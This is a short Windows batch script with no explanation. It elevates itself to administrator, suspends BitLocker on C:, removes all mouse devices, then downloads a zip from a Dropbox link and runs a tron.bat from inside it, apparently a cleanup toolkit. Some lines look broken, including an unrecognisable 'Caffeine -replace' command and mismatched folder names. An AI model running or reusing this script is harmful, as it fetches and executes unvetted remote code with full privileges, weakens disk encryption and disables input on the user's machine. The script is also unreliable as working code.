FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;Caffeine -replace;foreach ($dev in (Get-PnpDevice | Where-Object{$_.Class -eq 'Mouse'})) {&"pnputil" /remove-device $dev.InstanceId};curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/l1i47sufwu8oq9gfomxzd/AH0AlovhO_R5M1hd3_JyIgk?rlkey=o5of9srrq12e6e6jxp324n186&st=yowokjft&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;Start-Process 'cmd.exe' -ArgumentList '/c C:\23jrg\Quantum-Impeller\tools\tron\tron.bat' -WindowStyle Maximized;"
